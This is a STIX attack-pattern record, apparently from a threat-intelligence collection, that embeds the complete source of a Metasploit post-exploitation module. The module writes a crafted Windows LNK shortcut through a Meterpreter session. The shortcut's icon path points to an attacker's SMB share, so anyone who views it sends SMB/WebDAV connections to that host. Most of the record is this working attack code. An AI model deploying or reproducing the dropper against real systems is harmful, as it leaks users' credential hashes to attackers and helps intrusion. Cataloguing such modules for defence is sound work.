{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d67a5503-2ea3-4ec8-bd82-67e341c2380c",
    "created": "2024-08-14T16:33:04.625969Z",
    "modified": "2024-08-14T16:33:04.625972Z",
    "name": "Windows Escalate SMB Icon LNK Dropper",
    "description": " This module drops a shortcut (LNK file) that has a ICON reference existing on the specified remote host, causing SMB and WebDAV connections to be initiated from any user that views the shortcut.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/escalate/droplnk.rb",
            "external_id": "droplnk.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate SMB Icon LNK Dropper',\n        'Description' => %q{\n          This module drops a shortcut (LNK file) that has a ICON reference\n          existing on the specified remote host, causing SMB and WebDAV\n          connections to be initiated from any user that views the shortcut.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'mubix' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_getwd\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptAddress.new('LHOST', [ true, 'Host listening for incoming SMB/WebDAV traffic', nil]),\n        OptString.new('LNKFILENAME', [ true, \"Shortcut's filename\", 'Words.lnk']),\n        OptString.new('SHARENAME', [ true, 'Share name on LHOST', 'share1']),\n        OptString.new('ICONFILENAME', [ true, \"File name on LHOST's share\", 'icon.png'])\n      ]\n    )\n  end\n\n  def run\n    print_status 'Creating evil LNK'\n    lnk = ''\n    lnk << \"\\x4c\\x00\\x00\\x00\"                  # Header size\n    lnk << \"\\x01\\x14\\x02\\x00\\x00\\x00\\x00\\x00\"  # Link CLSID\n    lnk << \"\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\"\n    lnk << \"\\xdb\\x00\\x00\\x00\"                  # Link flags\n    lnk << \"\\x20\\x00\\x00\\x00\"                  # File attributes\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  # Creation time\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  # Access time\n    lnk << \"\\x30\\xcd\\x9a\\x97\\x40\\xae\\xcc\\x01\"  # Write time\n    lnk << \"\\x00\\x00\\x00\\x00\"                  # File size\n    lnk << \"\\x00\\x00\\x00\\x00\"                  # Icon index\n    lnk << \"\\x01\\x00\\x00\\x00\"                  # Show command\n    lnk << \"\\x00\\x00\"                          # Hotkey\n    lnk << \"\\x00\\x00\"                          # Reserved\n    lnk << \"\\x00\\x00\\x00\\x00\"                  # Reserved\n    lnk << \"\\x00\\x00\\x00\\x00\"                  # Reserved\n    lnk << \"\\x7b\\x00\"                          # IDListSize\n    # sIDList\n    lnk << \"\\x14\\x00\\x1f\\x50\\xe0\\x4f\\xd0\\x20\"\n    lnk << \"\\xea\\x3a\\x69\\x10\\xa2\\xd8\\x08\\x00\"\n    lnk << \"\\x2b\\x30\\x30\\x9d\\x19\\x00\\x2f\"\n    lnk << 'C:\\\\'\n    lnk << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    lnk << \"\\x00\\x00\\x00\\x4c\\x00\\x32\\x00\\x00\\x00\\x00\\x00\\x7d\\x3f\\x5b\\x15\\x20\"\n    lnk << \"\\x00\"\n    lnk << 'AUTOEXEC.BAT'\n    lnk << \"\\x00\\x00\\x30\\x00\\x03\\x00\\x04\\x00\\xef\\xbe\\x7d\\x3f\\x5b\\x15\\x7d\\x3f\"\n    lnk << \"\\x5b\\x15\\x14\\x00\\x00\\x00\"\n    lnk << Rex::Text.to_unicode('AUTOEXEC.BAT')\n    lnk << \"\\x00\\x00\\x1c\\x00\\x00\\x00\"\n    # sLinkInfo\n    lnk << \"\\x3e\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x01\\x00\"\n    lnk << \"\\x00\\x00\\x1c\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3d\\x00\"\n    lnk << \"\\x00\\x00\\x11\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x3e\\x77\\xbf\\xbc\\x10\\x00\"\n    lnk << \"\\x00\\x00\\x00\"\n    lnk << 'C:\\\\AUTOEXEC.BAT'\n    lnk << \"\\x00\\x00\\x0e\\x00\"\n    # RELATIVE_PATH\n    lnk << Rex::Text.to_unicode('.\\\\AUTOEXEC.BAT')\n    lnk << \"\\x03\\x00\"\n    # WORKING_DIR\n    lnk << Rex::Text.to_unicode('C:\\\\')\n    # ICON LOCATION\n    lnk << \"\\x1c\\x00\"\n    lnk << Rex::Text.to_unicode(\"\\\\\\\\#{datastore['LHOST']}\\\\#{datastore['SHARENAME']}\\\\#{datastore['ICONFILENAME']}`\")\n    lnk << \"\\x00\\x00\\x03\\x00\\x00\\xa0\\x58\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    lnk << 'computer'\n    lnk << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x26\\x4e\\x06\\x19\\xf2\\xa9\\x31\\x40\\x91\\xf0\"\n    lnk << \"\\xab\\x9f\\xb6\\xb1\\x6c\\x84\\x22\\x03\\x57\\x01\\x5e\\x1d\\xe1\\x11\\xb9\\x48\"\n    lnk << \"\\x08\\x00\\x27\\x6f\\xe3\\x1f\\x26\\x4e\\x06\\x19\\xf2\\xa9\\x31\\x40\\x91\\xf0\"\n    lnk << \"\\xab\\x9f\\xb6\\xb1\\x6c\\x84\\x22\\x03\\x57\\x01\\x5e\\x1d\\xe1\\x11\\xb9\\x48\"\n    lnk << \"\\x08\\x00\\x27\\x6f\\xe3\\x1f\\x00\\x00\\x00\\x00\"\n\n    print_status \"Done. Writing to disk - #{session.fs.dir.pwd}\\\\#{datastore['LNKFILENAME']}\"\n    file = client.fs.file.new(datastore['LNKFILENAME'], 'wb')\n    file.write(lnk)\n    file.close\n    print_status 'Done. Wait for evil to happen..'\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}